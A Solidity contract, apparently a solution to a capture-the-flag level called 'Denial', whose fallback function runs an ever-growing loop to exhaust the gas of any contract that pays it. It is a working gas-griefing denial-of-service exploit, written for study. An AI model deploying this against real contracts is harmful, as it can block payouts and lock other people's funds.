// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }
    // infinite loop will use up all the gas from the call funcion
    fallback() external payable {
        uint iterator = 10;
        for (uint i = 0; i < iterator; i++) {
            iterator += 10;
        }
    }
}
